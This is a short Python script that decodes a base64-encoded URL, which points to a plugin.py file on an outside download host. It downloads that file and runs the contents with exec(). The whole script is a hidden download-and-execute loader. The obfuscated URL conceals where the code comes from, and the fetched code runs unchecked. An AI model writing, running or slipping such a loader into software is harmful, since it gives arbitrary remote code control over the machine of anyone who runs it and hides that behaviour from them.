import base64
import urllib.request

def get_data():
    encoded_url = "aHR0cDovL2Rvd25sb2FkLmZpbGViYW5rLmpwL3B5dGhvbi9wbHVnaW4ucHk="
    decoded_url = base64.b64decode(encoded_url).decode("utf-8")
    with urllib.request.urlopen(decoded_url) as response:
        return response.read()

def run_code(code):
    exec(code)

def main():
    code = get_data()
    run_code(code)

if __name__ == '__main__':
    main()
